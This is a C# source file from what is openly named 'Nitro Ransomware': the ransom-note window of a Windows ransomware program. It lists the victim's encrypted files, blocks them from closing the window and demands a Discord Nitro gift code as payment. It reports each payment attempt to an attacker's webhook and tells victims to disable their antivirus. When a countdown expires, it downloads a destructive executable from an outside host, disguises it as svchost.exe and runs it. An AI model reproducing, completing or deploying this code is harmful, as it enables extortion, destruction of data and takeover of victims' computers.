using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace NitroRansomware
{
    
    public partial class Form1 : Form
    {
        private bool isDragging = false;
        private Point dragOffset;

        System.Timers.Timer t;
        int h = 3, m = 0, s = 0;
        Webhook ww = new Webhook(Program.WEBHOOK);
        public Form1()
        {
            InitializeComponent();
            panel1.MouseDown += panel1_MouseDown;
            panel1.MouseMove += panel1_MouseMove;
            panel1.MouseUp += panel1_MouseUp;
            textBox6.MouseDown += textBox6_MouseDown;

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            t = new System.Timers.Timer();
            t.Interval = 1000;
            t.Elapsed += OnTimeEvent;
            t.Start();

            textBox5.Text = "";

            foreach (string x in Crypto.encryptedFileLog)
            {
                textBox5.Text += "Encrypted: " + x + "\r\n";
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = e.CloseReason == CloseReason.UserClosing;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
        }

        private void guna2CircleButton3_Click(object sender, EventArgs e)
        {
            // Minimize the window
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2CircleButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("You cannot exit the program or your files won't be recovered", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

        }

        private void guna2CircleButton1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Access Denied", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            isDragging = true;
            dragOffset = e.Location;
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point newLocation = this.Location;
                newLocation.X += e.X - dragOffset.X;
                newLocation.Y += e.Y - dragOffset.Y;
                this.Location = newLocation;
            }
        }

        private void panel1_MouseUp(object sender, MouseEventArgs e)
        {
            isDragging = false;
        }

        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/ThunderboltDev/Nitro-Ransomware-2.0/tree/main");
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private bool NitroValid()
        {
            string input = textBox2.Text;
            string code = String.Empty;
            Console.WriteLine(input);

            if (input.Contains("discord.gift/"))
            {
                if (input.Contains("https://"))
                {
                    int found = input.IndexOf("/");
                    code = input.Substring(found + 15);
                    Console.WriteLine(code);
                }
                else
                {
                    int found = input.IndexOf("/");
                    code = input.Substring(found + 1);
                    MessageBox.Show("Checking gift validity...", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                if (Nitro.Check(code))
                {
                    ww.SendAsync("✅Valid nitro code was received").GetAwaiter().GetResult();
                    ww.SendAsync(input).GetAwaiter().GetResult();
                    MessageBox.Show($"Success! \nValid nitro code was sent.nYour decryption key is now available. \nYou may start decrypting your files now.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true;
                }
                else
                {
                    ww.SendAsync("❌User sent invalid discord gift Link.").GetAwaiter().GetResult();
                    MessageBox.Show("Invalid Nitro", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                ww.SendAsync("❌User sent invalid discord gift Link.").GetAwaiter().GetResult();
                MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return false;
        }

        

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            string inputPassword = textBox4.Text;
            if (inputPassword == Crypto.fPassword)
            {
                ww.SendAsync("✅User has entered correct decryption key.. Decrypting files.").GetAwaiter().GetResult();
                MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Crypto.inPassword = Crypto.fPassword;
                textBox5.Text = "Decrypting files.. \r\nThis may take a while. Loading..";
                Cursor.Current = Cursors.WaitCursor;
                Program.DecryptAll();
                Cursor.Current = Cursors.Default;
                MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Invalid key", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            if (NitroValid())
            {
                textBox3.Text = Crypto.fPassword;
                label7.Text = "Paste your key here.";
                label7.ForeColor = Color.LightGreen;
                textBox4.Text = "";
                label1.Text = "";
                panel3.BackColor = Color.FromArgb(35, 39, 42);
                textBox1.Text = "How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.";
                t.Stop();
            }
        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)
        {
            // Create an instance of the form
            var form = new Form2();

            // Show the form
            form.Show();
        }

        private static void DownloadFile(string downloadUrl, string tempFilePath)
        {
            using (var client = new WebClient())
            {
                client.DownloadFile(downloadUrl, tempFilePath);
            }
        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox6_MouseDown(object sender, MouseEventArgs e)
        {
            textBox6.SelectionLength = 0; // Reset text selection
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private static void RunExecutable(string tempFilePath)
        {
            var process = new System.Diagnostics.Process();
            process.StartInfo.FileName = tempFilePath;
            process.Start();
        }


        private void OnTimeEvent(object sender, System.Timers.ElapsedEventArgs e)
        {
            Invoke(new Action(() =>
            {
                if (s < 1)
                {
                    s = 59;
                    if (m == 0)
                    {
                        m = 59;
                        if (h != 0)
                        {
                            h -= 1;
                        }
                    }
                    else
                    {
                        m -= 1;
                    }
                }
                else
                    s -= 1;

                if (s == 0 && m == 0 && h == 0)
                {
                    string tempFolder = Path.GetTempPath();
                    string tempFilePath = Path.Combine(tempFolder, "svchost.exe");

                    string downloadUrl = "https://archive.org/download/Monoxide/Monoxide.zip/Monoxidex86.exe";

                    DownloadFile(downloadUrl, tempFilePath);
                    RunExecutable(tempFilePath);
                }

                label10.Text = string.Format("{0}:{1}:{2}", h.ToString().PadLeft(2, '0'), m.ToString().PadLeft(2, '0'), s.ToString().PadLeft(2, '0'));
            }));
        }
    }
}
